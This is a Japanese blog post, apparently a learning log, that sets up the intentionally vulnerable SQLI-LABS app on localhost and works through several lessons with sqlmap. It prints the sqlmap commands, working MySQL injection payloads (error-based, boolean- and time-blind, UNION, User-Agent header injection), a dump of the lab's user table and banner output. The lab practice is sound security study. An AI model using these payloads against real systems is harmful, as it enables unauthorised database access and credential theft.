<div style="text-align: center;">[f:id:motikan2010:20201130185745p:plain:w600]</div>  

<div class="contents-box">
  <p>[:contents]</p>
</div>

## はじめに

　今回は「SQLI-LABS」を利用してさまざまなSQLi(SQL Injection)を学んでいきます。  
SQLI-LABS は<span class="m-y">SQLi用やられWebアプリケーション</span>で、SQLi攻撃を実際にやってみることでSQLiについて学ぶことができます。  

　 SQLI-LABS は**65種類**(問題一覧からは75問あるように見えたが404だった...)のSQLiを学べるらしいので早速遊んでみました。  

　動作DBはMySQLです。

- SQLI-LABS の開発リポジトリ
[https://github.com/Audi-1/sqli-labs:embed:cite]  

## 環境構築

### インストール

　インストールは非常に簡単で、リポジトリをWebサーバ上のドキュメントルート上に配置するだけ。

<div class="md-code" style="width:70%">
```
$ cd /var/www/html/
$ git clone https://github.com/Audi-1/sqli-labs.git
$ cd sqli-labs
```
</div>

<!-- more -->

### データベース設定

　「security」データベース参照が固定になっているので、  
ここで変更するのは、ユーザ名とパスワードだけがいいです。  

<div class="md-code" style="width:70%">
```
$ vim sql-connections/db-creds.inc
```
</div>

<div class="md-code" style="width:70%">
```php
<?php

//give your mysql connection username n password
$dbuser ='root';
$dbpass ='';
$dbname ="security";
$host = 'localhost';
$dbname1 = "challenges";
?>
```
</div>

### データベース・テーブル初期化

「`http://(Webサーバ)/sqli-labs/`」にアクセスします。  

[f:id:motikan2010:20170611100736p:plain:w600]  

[`Setup/reset Database for labs`]にアクセスすると使用するデータベースの初期化行われます。  
  
[f:id:motikan2010:20170611101218j:plain:w600]
  
これで「SQLI-LABS」が使えるようになります。

## 動作確認

　一番簡単であろう、「Less-1 (GET - Error based - Single quotes - String)」からさわってみます。  

[f:id:motikan2010:20170611141146j:plain:w600]  

「idパラメータに数字を入力」と書かれた黒い画面が表示されます。
[f:id:motikan2010:20170611140728j:plain:w600]  

指示通りに「`?id=1`」を入力します。  
[f:id:motikan2010:20170611142107j:plain:w600]  

ユーザ情報が表示されました。いかにもidパラメータにSQLiがありそう。  
次に「`'`」を入力します。  DBエラーになりました。
[f:id:motikan2010:20170611142619j:plain:w600]  

「`''`」を入力。  
今度はエラーにならないことから、やはり「id」パラメータにSQLiの疑いがあります。
[f:id:motikan2010:20170611142901j:plain:w600]  


　手動でテーブル等を取得するのも手間なので、ここからは自動でSQLiの検出とデータ取得を自動的に行ってくれる「<b>sqlmap</b>」を使っていきます。  
難易度が上がるごとに、手動だと検出さえできないものもあるかと思いますので、早速使用していきます。  
[https://github.com/sqlmapproject/sqlmap:embed:cite]  
  
　ツールの詳しい使い方や起動オプションについてはこちらを参照。  
[https://github.com/sqlmapproject/sqlmap/wiki/Usage:title] 
 
### Less-1 (GET - Error based - Single quotes - String)

　「---」の間に表示されているのが、検出されたSQLiの種類を表している。  
テーブルの内容も取得できていることが分かる。改めてSQLiコワイ。

<div class="md-code" style="width:100%">
```
$ python2.6 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --dump
```
</div>

<div class="md-code" style="width:100%">
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 4906=4906 AND 'gcKD'='gcKD

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 9809 FROM(SELECT COUNT(*),CONCAT(0x71786b7a71,(SELECT (ELT(9809=9809,1))),0x7162767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'uTqI'='uTqI

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5) AND 'aTCG'='aTCG

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-6200' UNION ALL SELECT NULL,CONCAT(0x71786b7a71,0x556f6374546f58637a724149634156656161507666636d644a4c7264676271716f754a6f6f525945,0x7162767a71),NULL-- bzyx
---

（中略）

Database: security
Table: users
[13 entries]
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | Dumb     | Dumb       |
| 2  | Angelina | I-kill-you |
| 3  | Dummy    | p@ssword   |
| 4  | secure   | crappy     |
| 5  | stupid   | stupidity  |
| 6  | superman | genious    |
| 7  | batman   | mob!le     |
| 8  | admin    | admin      |
| 9  | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+

(以下省略)
```
</div>

　どんどんレベルを上げていくことにする。  
下記３つも特にオプションを指定せずに、テーブルの内容を取得することができた。

- Less-2 (GET - Error based - Intiger based)
- Less-3 (GET - Error based - Single quotes with twist - string)
- Less-4 (GET - Error based - Double Quotes - String)

### Less-5 (GET - Double Injection - Single Quotes - String)

　時間短縮のために下記２点を変更しました。  

- 「`--dbms MySQL`」オプションの付与
- 「`--dump`」オプション(レコード内容を取得)を「`--banner`」オプション(DBのバナー情報を取得)に変更

<div class="md-code" style="width:100%">
```
$ python2.6 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-5/?id=1" --banner --dbms MySQL

（中略）

---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5282=5282 AND 'FCUt'='FCUt

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 6146 FROM(SELECT COUNT(*),CONCAT(0x7170707a71,(SELECT (ELT(6146=6146,1))),0x7162787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'vYqp'='vYqp

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5) AND 'KeMK'='KeMK
---

（中略）

web server operating system: Linux CentOS 6.8
web application technology: PHP 5.4.36, Apache 2.2.15
back-end DBMS: MySQL >= 5.0.0
banner:    '5.1.73-log'
```
</div>

　続けて、下記４点も突破することができた。  

- Less-6 (GET - Double Ingection - Double Quotes - String)
- Less-7 (GET - Dump into outfile - String)
- Less-8 (GET - Blind - Boolian Based - Single Quotes)
- Less-9 (GET - Blind - Time based. - Single Quotes)

### Less-10 (GET - Blind - Time based - double quotes)

#### level 1 ⇒ 失敗

<div class="md-code" style="width:100%">
```
$ python2.6 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-10/?id=1" --banner --dbms MySQL

（中略）

[09:06:48] [WARNING] GET parameter 'id' does not seem to be injectable
```

デフォルトでは「\--level」オプションの値は"1"になっていますので、今度は「\--level 2」オプションを付与してやってみます。

#### level 2 ⇒ 成功
```
$ python2.6 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-10/?id=1" --banner --dbms MySQL --level 2

---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1" AND 1115=1115 AND "FYxx"="FYxx

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1" AND SLEEP(5) AND "Kufp"="Kufp
---
```
</div>

### Less-11 (POST - Error Based - Single quotes - String)

<div class="md-code" style="width:100%">
```
$ python2.6 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-11/" --data="uname=Dumb&passwd=Dumb&submit=Submit" --dbms MySQL

---
Parameter: passwd (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=Dumb&passwd=Dumb' AND 7224=7224 AND 'XczC'='XczC&submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=Dumb&passwd=Dumb' AND (SELECT 5640 FROM(SELECT COUNT(*),CONCAT(0x7176767171,(SELECT (ELT(5640=5640,1))),0x716b627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'iIig'='iIig&submit=Submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: uname=Dumb&passwd=Dumb' AND SLEEP(5) AND 'nfze'='nfze&submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: uname=Dumb&passwd=-3874' UNION ALL SELECT CONCAT(0x7176767171,0x59794449726d6876654c757179796c4d50685572796a746d796a6c747a756a4c4b5073507a595746,0x716b627671),NULL-- LzoO&submit=Submit

Parameter: uname (POST)
    Type: boolean-based blind

（以下省略）
---
```
</div>

　網羅するのも大変ですので、気になるタイトルのものに手をつけてみます。

### Less-18 (POST - Header Injection - Uagent field - Error based)

<div class="md-code" style="width:100%">
```
$ python2.6 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-18/index.php" --data="uname=Dumb&passwd=Dumb&submit=Submit" --headers="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36" --dbms MySQL --level 3

---
Parameter: User-Agent (User-Agent)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' AND (SELECT 8176 FROM(SELECT COUNT(*),CONCAT(0x7171717171,(SELECT (ELT(8176=8176,1))),0x71707a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'canv'='canv

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' OR SLEEP(5) AND 'emKT'='emKT
---
```
</div>

### Less-23 (GET - Error based - strip comments)

<div class="md-code" style="width:100%">
```
$ python2.6 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-23/?id=1" --banner --dbms MySQL

---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6234=6234 AND 'sZEB'='sZEB

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 2226 FROM(SELECT COUNT(*),CONCAT(0x716b787671,(SELECT (ELT(2226=2226,1))),0x71707a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'sIMQ'='sIMQ

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5) AND 'gHxA'='gHxA
---
```
</div>

### Less-53 (GET - Blind based - ORDER BY CLAUSE - String - stacked injection)

<div class="md-code" style="width:100%">
```
$ python2.6 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-53/?sort=0" --banner --dbms MySQL --level 2

---
Parameter: sort (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: sort=0' RLIKE (SELECT (CASE WHEN (1167=1167) THEN 0 ELSE 0x28 END)) AND 'uqmm'='uqmm

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sort=0' AND (SELECT * FROM (SELECT(SLEEP(5)))VcHi) AND 'ISSZ'='ISSZ
---

（中略）

web server operating system: Linux CentOS 6.8
web application technology: PHP 5.4.36, Apache 2.2.15
back-end DBMS: MySQL >= 5.0.12
banner:    '5.1.73-log'
```
</div>

　「SQLi-LABS Page-4 (Challenges)」は回数制限ありのSQLiの問題が集まっているようでした。  
SQLi力のない私はそっとじ・・・。

　軽く「SQLI-LABS」をさわってみましたが、sqlmapを使うための学習にうってつけのツールでした。









